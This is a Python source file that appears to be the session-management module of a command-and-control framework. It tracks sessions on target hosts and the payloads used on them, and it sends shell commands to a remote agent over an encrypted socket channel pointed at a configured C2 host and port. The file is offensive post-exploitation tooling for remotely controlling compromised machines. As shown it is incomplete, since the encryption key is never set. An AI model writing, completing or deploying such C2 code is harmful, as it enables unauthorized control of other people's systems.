import uuid, time, threading, json, socket, struct
from datetime import datetime
from .database import db_session, Session as DBSession, Host, store_session, log_operation
from .utils import log
from cryptography.fernet import Fernet
import base64

class SessionManager:
    _instance = None; _lock = threading.Lock()
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None: cls._instance = super().__new__(cls); cls._instance.sessions = {}
        return cls._instance
    def create(self, host_ip, session_type, payload_used="", tunnel=None):
        sid = str(uuid.uuid4())[:8]
        with db_session() as db:
            host = db.query(Host).filter_by(ip_address=host_ip).first()
            if not host: host = Host(ip_address=host_ip, last_seen=datetime.now()); db.add(host); db.commit()
            store_session(db, host, session_type, sid, payload_used, tunnel or {})
        self.sessions[sid] = {"id":sid, "host":host_ip, "type":session_type, "created":datetime.now(), "status":"active",
                              "c2_host":"127.0.0.1", "c2_port":8443, "fernet":None}
        return sid
    def list(self): return list(self.sessions.values())
    def get(self, sid): return self.sessions.get(sid)
    def kill(self, sid):
        if sid in self.sessions: del self.sessions[sid]
    def send_command(self, sid, command):
        s = self.get(sid)
        if not s: return "Session not found"
        fernet = s.get('fernet')
        if not fernet:
            return "Session not yet keyed (no ECDH complete)"
        try:
            sock = socket.create_connection((s['c2_host'], s['c2_port']), timeout=10)
            msg = json.dumps({"action":"cmd","agent_id":sid,"args":{"cmd":command}})
            sock.send(struct.pack(">I", len(msg)) + msg.encode())
            length = struct.unpack(">I", sock.recv(4))[0]
            data = sock.recv(length)
            sock.close()
            return fernet.decrypt(data).decode()
        except Exception as e: return str(e)
